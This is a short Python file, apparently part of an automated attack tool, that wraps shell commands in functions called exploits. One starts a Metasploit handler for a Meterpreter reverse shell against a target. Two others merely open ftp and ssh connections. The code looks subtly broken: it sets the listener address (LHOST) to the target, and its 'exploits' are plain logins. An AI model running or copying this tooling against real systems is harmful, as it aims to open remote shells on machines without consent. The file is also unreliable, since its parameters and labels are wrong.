from app.tools.run_shell_command import run_shell_command

def metasploit_exploit(target):
    command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {target}; run'"
    return run_shell_command(command)

def ftp_exploit(target):
    command = f"ftp {target}"
    return run_shell_command(command)

def ssh_exploit(target):
    command = f"ssh {target}"
    return run_shell_command(command)
